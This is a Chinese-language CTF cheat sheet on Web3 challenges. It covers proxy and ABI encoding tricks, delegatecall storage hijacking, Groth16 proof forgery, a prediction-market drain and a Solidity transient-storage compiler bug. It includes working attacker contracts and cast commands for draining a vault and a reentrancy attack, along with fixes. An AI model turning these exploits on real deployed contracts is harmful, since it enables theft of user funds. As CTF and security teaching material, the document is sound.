# CTF Web - Web3 / 区块链挑战

## 目录
- [挑战基础设施模式](#挑战基础设施模式)
  - [认证实现（Python）](#认证实现python)
- [EIP-1967 代理模式利用](#eip-1967-代理模式利用)
- [ABI Coder v1 与 v2 —— 脏地址绕过](#abi-coder-v1-与-v2--脏地址绕过)
- [剥离 Solidity CBOR 元数据以绕过 codehash 校验](#剥离-solidity-cbor-元数据以绕过-codehash-校验)
- [非标准 ABI calldata 编码](#非标准-abi-calldata-编码)
- [Solidity bytes32 字符串编码](#solidity-bytes32-字符串编码)
- [完整利用流程（House of Illusions）](#完整利用流程house-of-illusions)
- [Delegatecall 存储上下文滥用（EHAX 2026）](#delegatecall-存储上下文滥用ehax-2026)
- [针对区块链治理的 Groth16 证明伪造（DiceCTF 2026）](#针对区块链治理的-groth16-证明伪造dicectf-2026)
- [幽灵市场反结算 + 强制充值（DiceCTF 2026）](#幽灵市场反结算--强制充值dicectf-2026)
- [Solidity 瞬态存储清理辅助函数冲突（Solidity 0.8.28-0.8.33）](#solidity-瞬态存储清理辅助函数冲突solidity-0828-0833)
- [重入攻击 —— DAO 模式（DefCamp 2017）](#重入攻击--dao-模式defcamp-2017)
- [签名与随机性弱点](#签名与随机性弱点)
- [Web3 CTF 技巧](#web3-ctf-技巧)

---

<a id="challenge-infrastructure-pattern"></a>
## 挑战基础设施模式

1. **认证**：GET `/api/auth/nonce` → 用 `personal_sign` 签名 → POST `/api/auth/login`
2. **创建实例**：在链上调用 `factory.createInstance()`（需要测试网 ETH）
3. **利用**：与已部署的实例合约交互
4. **检查**：GET `/api/challenges/check-solution` → 若 `isSolved()` 为真则返回 flag

<a id="auth-implementation-python"></a>
### 认证实现（Python）
```python
from eth_account import Account
from eth_account.messages import encode_defunct
import requests

acct = Account.from_key(PRIVATE_KEY)
s = requests.Session()
nonce = s.get(f'{BASE}/api/auth/nonce').json()['nonce']
msg = encode_defunct(text=nonce)
sig = acct.sign_message(msg)
r = s.post(f'{BASE}/api/auth/login', json={
    'signedNonce': '0x' + sig.signature.hex(),
    'nonce': nonce,
    'account': acct.address.lower()  # 挑战特定：该服务器要求小写地址
})
s.cookies.set('token', r.json()['token'])
```

**要点说明：**
- 部分 CTF 服务器要求小写地址（而非 EIP-55 校验和格式）—— 查看前端 JS 确认。这并非通用规则；其他挑战可能要求校验和格式
- Bundle.js 里含 chain ID、合约地址和认证流程细节
- 链上交互用 `cast`（Foundry）：`cast call`、`cast send`、`cast storage`

---

<a id="eip-1967-proxy-pattern-exploitation"></a>
## EIP-1967 代理模式利用

**存储槽：**
```text
Implementation: keccak256("eip1967.proxy.implementation") - 1
Admin:          keccak256("eip1967.proxy.admin") - 1
```

```bash
cast storage $PROXY 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc  # impl
cast storage $PROXY 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103  # admin
```

**关键要点：** 代理把调用委托给实现合约，但存储位于代理上。在 delegatecall 中 `address(this)` = 代理地址。

---

<a id="abi-coder-v1-vs-v2---dirty-address-bypass"></a>
## ABI Coder v1 与 v2 —— 脏地址绕过

Solidity 0.8.x 默认使用 ABI coder v2，它会校验 `address` 参数的高 12 字节为零。使用 `pragma abicoder v1` 时没有该校验。

**模式（House of Illusions）：**
1. 合约需要一个含脏字节的地址，但用的是 `address` 类型
2. ABI coder v2 以空 revert 数据（`"0x"`）拒绝
3. 用 `pragma abicoder v1` 部署 → 字节码不同，无校验
4. 通过代理的升级函数替换实现合约

**检测：** 调用以空数据（`"0x"`）revert = ABI coder v2 校验失败。

---

<a id="solidity-cbor-metadata-stripping-for-codehash-bypass"></a>
## 剥离 Solidity CBOR 元数据以绕过 codehash 校验

代理检查 `keccak256(strippedCode) == ALLOWED_CODEHASH`，其中代码已剥离元数据。

```python
code = bytes.fromhex(bytecode[2:])
meta_len = int.from_bytes(code[-2:], 'big')
stripped = code[:len(code) - meta_len - 2]
codehash = keccak256(stripped)
```

---

<a id="non-standard-abi-calldata-encoding"></a>
## 非标准 ABI calldata 编码

**重叠 calldata：** 当合约强制 `msg.data.length == 100`，但参数为 `(address, bytes)` 时：
```text
Standard: 4 + 32(addr) + 32(offset=0x40) + 32(len) + 32(data) = 132 bytes
Crafted:  4 + 32(dirty_addr) + 32(offset=0x20) + 32(sigil_data) = 100 bytes
```
偏移 `0x20` 同时充当偏移指针和 bytes 长度。

---

<a id="solidity-bytes32-string-encoding"></a>
## Solidity bytes32 字符串编码

`bytes32("0xAnan or Tensai?")` 以 ASCII 左对齐、右侧补零的方式存储：
```text
0x3078416e616e206f722054656e7361693f000000000000000000000000000000
```

---

<a id="complete-exploit-flow-house-of-illusions"></a>
## 完整利用流程（House of Illusions）

```bash
export PATH="$PATH:$HOME/.foundry/bin"
RPC="https://ethereum-sepolia-rpc.publicnode.com"

forge create src/IllusionHouse.sol:IllusionHouse --private-key $KEY --rpc-url $RPC --broadcast
cast send $PROXY "reframe(address)" $NEW_IMPL --private-key $KEY --rpc-url $RPC
cast send $PROXY $CRAFTED_CALLDATA --private-key $KEY --rpc-url $RPC
cast send $PROXY "appointCurator(address)" $MY_ADDR --private-key $KEY --rpc-url $RPC
cast call $FACTORY "isSolved(address)(bool)" $MY_ADDR --rpc-url $RPC
```

---

<a id="delegatecall-storage-context-abuse-ehax-2026"></a>
## Delegatecall 存储上下文滥用（EHAX 2026）

**模式（Heist v1）：** Vault 合约有 `execute()`，对治理合约执行 `delegatecall`。`setGovernance()` **没有访问控制**。

**存储布局认知：** `delegatecall` 在被调用方（caller）的存储上下文中运行被调用代码。若 vault 为：
- Slot 0：`paused`（bool）+ `fee`（uint248）—— 打包
- Slot 1：`admin`（address）
- Slot 2：`governance`（address）

则在被委托合约中写 slot 0/1 会修改 vault 的 `paused` 与 `admin`。

**攻击链：**
1. 部署与 vault 存储布局一致的攻击者合约
2. `setGovernance(attacker_address)` —— 无访问控制
3. `execute(abi.encodeWithSignature("attack(address)", player))` —— delegatecall
4. 攻击者的 `attack()` 把 `paused=false` 写入 slot 0、`admin=player` 写入 slot 1
5. `withdraw()` —— 此时已作为 admin 且 vault 已解除暂停

```solidity
contract Attacker {
    bool public paused;      // slot 0（匹配 vault 布局）
    uint248 public fee;      // slot 0
    address public admin;    // slot 1
    address public governance; // slot 2

    function attack(address _newAdmin) public {
        paused = false;
        admin = _newAdmin;
    }
}
```

```bash
# 部署攻击者合约
forge create Attacker.sol:Attacker --rpc-url $RPC --private-key $KEY
# 劫持治理权
cast send $VAULT "setGovernance(address)" $ATTACKER --rpc-url $RPC --private-key $KEY
# 执行 delegatecall
CALLDATA=$(cast calldata "attack(address)" $PLAYER)
cast send $VAULT "execute(bytes)" $CALLDATA --rpc-url $RPC --private-key $KEY
# 提走资金
cast send $VAULT "withdraw()" --rpc-url $RPC --private-key $KEY
```

**关键要点：** 始终检查 `setGovernance()` / `setImplementation()` / 升级函数是否有访问控制。未受保护的治理 setter + delegatecall = 完全控制存储。

---

<a id="groth16-proof-forgery-for-blockchain-governance-dicectf-2026"></a>
## 针对区块链治理的 Groth16 证明伪造（DiceCTF 2026）

**模式（Housing Crisis）：** DAO 治理由 Groth16 ZK 证明保护。两个 ZK 特有的漏洞：

**损坏的 trusted setup（delta == gamma）：** 可平凡地伪造任意证明：
```python
from py_ecc.bn128 import G1, G2, multiply, add, neg

# 当 vk_delta_2 == vk_gamma_2 时，设置：
forged_A = vk_alpha1
forged_B = vk_beta2
forged_C = neg(vk_x)  # 对公开输入累加器取负
# 该证明对任意公开输入均可通过验证
```

**证明重放（未约束的 nullifier）：** DAO 从不记录已使用的 `proposalNullifierHash`。从 setup 合约的部署交易中取出一个有效证明，对每个提案重放即可。

**在 Web3 挑战中应检查的点：**
1. 比较 `vk_delta_2` 与 `vk_gamma_2` —— 若相等，Groth16 被平凡攻破
2. 检查验证器合约是否记录证明 nullifier
3. 在部署/setup 交易中寻找有效证明

---

<a id="phantom-market-unresolve--force-funding-dicectf-2026"></a>
## 幽灵市场反结算 + 强制充值（DiceCTF 2026）

**模式（Housing Crisis）：** 带 DAO 治理的预测市场。三个漏洞组合抽干市场。

**漏洞 1 —— 幽灵市场下注：**
`bet()` 检查 `marketResolution[market] == 0`，但不检查市场是否正式存在（没有 `market < nextMarketIndex` 检查）。可对幽灵市场 ID（超出 `nextMarketIndex`）下注。

**漏洞 2 —— 反结算时的状态残留：**
当 `createMarket()` 后来推进到该幽灵市场 ID 时，它写入 `marketResolution[id] = 0`。这实际上"反结算"了市场，但旧的 `totalYesBet`/`totalNoBet` 值仍然保留，从而可以二次提现。

**漏洞 3 —— 通过 selfdestruct 强制充值：**
```solidity
// EIP-6780：构造函数中的 selfdestruct 即使目标合约没有 receive() 也能转入 ETH
contract ForceSend {
    constructor(address payable target) payable {
        selfdestruct(target);  // 强制把 ETH 打入 DAO
    }
}
// 部署：new ForceSend{value: amount}(dao_address)
```

**抽干循环：**
1. 用 `2*marketBalance` wei 强制给 DAO 充值
2. Helper1 在幽灵市场 N 上以 1 wei 下注 NO
3. DAO 通过 delegatecall 提案以 `2*marketBalance` 下注 YES
4. 市场按 NO 结算 → Helper1 提现（市场净额为零，但 `totalYesBet` 仍保留）
5. `createMarket()` 推进到 N → 写入 `marketResolution[N]=0`（反结算）
6. Helper2 以 1 wei 下注 NO → 按 NO 结算 → Helper2 提现 = `1 + totalYesBet/2 = 1 + marketBalance`

**关键算式：** 赔付 = `helperBet + helperBet * totalYesBet / totalNoBet = 1 + 1 * 2*mBal / 2 = 1 + mBal`。市场原有 `mBal + 1`，付出 `1 + mBal` → 余额为 0。

**易踩的坑：**
- **余额不足时 EVM `.call` 会静默失败** —— 让 DAO 的下注金额使赔付 ≤ 市场余额
- **ethers.js BigInt：** 比较时用 `!== 0n`，不要用 `!== 0`
- **EIP-6780 selfdestruct：** 只有写在构造函数中（而非运行时）才能在同一交易内删除合约，但 ETH 转账两种情况都生效

**应检查的点：** 预测市场 / 下注类合约 —— 始终测试：能否对不存在的市场 ID 下注？创建市场是否会重置结算状态却不清理下注总额？

---

<a id="solidity-transient-storage-clearing-helper-collision-solidity-0828-0833"></a>
## Solidity 瞬态存储清理辅助函数冲突（Solidity 0.8.28-0.8.33）

**受影响：** Solidity 0.8.28 至 0.8.33，仅 IR 流水线（`--via-ir` 编译选项）。0.8.34 已修复。

**根因：** IR 流水线会为 `delete` 操作生成 Yul 辅助函数。辅助函数名由值类型推导而来，但**遗漏了存储位置**（持久化 vs 瞬态）。当合约对同类型的持久化变量和瞬态变量都执行 `delete` 时，两者生成同名的辅助函数。先编译的那个决定实现 —— 另一个使用**错误的操作码**（`sstore` 而非 `tstore`，或反之）。

**易受攻击的模式：**
```solidity
contract Vulnerable {
    address public owner;                    // 持久化，slot 0
    mapping(uint256 => address) public m;    // 持久化
    address transient _lock;                 // 瞬态

    function guarded() external {
        require(_lock == address(0), "locked");
        _lock = msg.sender;
        // BUG：delete _lock 使用了 sstore（持久化）而非 tstore
        // 这会把 slot 0 写零，覆盖 owner！
        delete _lock;
    }
}
```

**两个利用方向：**
1. **瞬态 `delete` 使用 `sstore`：** 覆盖持久化存储（slot 0 = owner/访问控制变量）。瞬态变量仍保持置位，重入锁失效
2. **持久化 `delete` 使用 `tstore`：** 授权/映射无法撤销。`tstore` 写入在交易结束时被丢弃

**通过数组清理产生的跨类型冲突：** 数组 `.pop()`、`delete []`以及缩小操作按 slot 粒度、使用 `uint256` 辅助函数清理。清理 `bool[]` 会与 `delete uint256 transient _temp` 冲突。

**检测：**
```bash
# 对比 Yul 输出 —— 若 0.8.34 中 storage_set_to_zero_ 调用
# 变成 transient_storage_set_to_zero_，说明合约曾受影响
solc --via-ir --ir Contract.sol > yul_output.txt
```

**规避：** 把 `delete _lock` 换成 `_lock = address(0)` —— 直接赋零走正确的操作码路径。

**关键要点：** 该 bug 需要三个条件同时成立：`--via-ir` 编译、对瞬态变量的 `delete`、同一编译单元中存在同类型的持久化 `delete`。编译器不会给出任何警告，而且错误的存储操作不会 revert —— 它会静默破坏状态。

---

<a id="reentrancy-attack---dao-pattern-defcamp-2017"></a>
## 重入攻击 —— DAO 模式（DefCamp 2017）

**模式：** `withdraw()` 在更新发送者余额之前，先通过 `msg.sender.call.value(amount)()` 发送 ETH。恶意合约的 fallback 函数递归再次调用 `withdraw()`，在余额被置零之前抽干资金。

```solidity
// 易受攻击的合约：
contract VulnerableBank {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint amount = balances[msg.sender];
        require(amount > 0);
        // BUG：在更新状态之前发送 ETH
        (bool success,) = msg.sender.call{value: amount}("");
        require(success);
        balances[msg.sender] = 0;   // 太晚了 —— 攻击者已在此行之前重入
    }
}
```

```solidity
// 攻击者合约：
contract Attacker {
    VulnerableBank public target;
    uint public count;

    constructor(address _target) {
        target = VulnerableBank(_target);
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    // Fallback：在余额尚未置零时重入 withdraw()
    receive() external payable {
        if (count < 10 && address(target).balance >= msg.value) {
            count++;
            target.withdraw();   // 重入调用
        }
    }
}
```

```python
# 通过 web3.py / Foundry 部署并触发：
# forge create Attacker --constructor-args $VULNERABLE_ADDR --rpc-url $RPC --private-key $KEY
# cast send $ATTACKER "attack()" --value 1ether --rpc-url $RPC --private-key $KEY
```

**修复范式：**
```solidity
// 方案 1：Checks-Effects-Interactions（发送之前先清零余额）
function withdraw() public {
    uint amount = balances[msg.sender];
    require(amount > 0);
    balances[msg.sender] = 0;           // 先做 effect
    (bool success,) = msg.sender.call{value: amount}("");
    require(success);
}

// 方案 2：使用 transfer() —— gas 限制 2300（不足以重入）
payable(msg.sender).transfer(amount);

// 方案 3：ReentrancyGuard（OpenZeppelin）
```

**关键要点：** 在状态更新之前通过 `call.value()` 做外部调用会产生重入 —— 攻击者的 fallback 会在第一次调用完成前重入有漏洞的函数。DAO 事件（2016）正是用这个模式抽走了 6000 万美元。做外部调用之前，务必先清零余额或使用互斥锁。

---

<a id="signature-and-randomness-weaknesses"></a>
## 签名与随机性弱点

Solidity 合约常用 `ecrecover` 验证签名，并从链上状态派生随机数。常见 CTF 陷阱：

**签名可塑/重放：** `ecrecover` 同时接受同一签名的低 `s` 与高 `s` 两种形式，且签名对其未被绑定的任意消息都有效。应把签名绑定到合约、签名者、nonce、chain ID 和过期时间（EIP-712），并记录已使用的 nonce。

```solidity
bytes32 digest = keccak256(abi.encodePacked(nonce, msg.sender, amount));
address signer = ecrecover(digest, v, r, s);
require(signer == owner, "bad sig");
require(!used[nonce], "replay");
used[nonce] = true;
```

**可预测的随机性：** `block.timestamp`、`blockhash` 和 `block.prevrandao` 都不是秘密，可被矿工/验证者影响或提前得知。绝不要用于抽奖或密钥生成；优先使用 VRF（如 Chainlink）或带抢跑检查的提交-揭示方案。

**ECDSA nonce 复用 / 部分 nonce：** 复用或有偏的 `k` 值会泄漏私钥。链上签名中重复出现 `r` 值即可瞬间破解。

**关键要点：** Web3 的"加密"类漏洞通常是签名绑定与随机数质量的问题，而不是密码算法本身被攻破 —— 先检查 `ecrecover` 用法、nonce 记录和任何链上 RNG。

---
<a id="web3-ctf-tips"></a>
## Web3 CTF 技巧

- **Factory 模式：** 实例 = 每名玩家的合约。检查 `playerToInstance(address)` 映射。
- **代理 fallback：** 所有无法识别的调用都通过 delegatecall 转发给实现合约。
- **升级函数：** 检查它们是否有访问控制！很多挑战会把这些开放着。
- **delegatecall 中的 address(this)：** 始终指向代理，而不是实现合约。
- **存储布局：** mapping 用 `keccak256(abi.encode(key, slot))` 计算存储位置。
- **空 revert 数据（`0x`）：** 通常是 ABI 解码器校验失败。
- **合约 nonce：** 从 1 开始。nonce = 1 表示尚未创建子合约。
- **推导子合约地址：** `keccak256(rlp.encode([parent_address, nonce]))[-20:]`
- **Foundry 工具：** `cast call`（读）、`cast send`（写）、`cast storage`（原始 slot）、`forge create`（部署）
- **Sepolia 水龙头：** Google Cloud faucet（0.05 ETH）、Alchemy、QuickNode
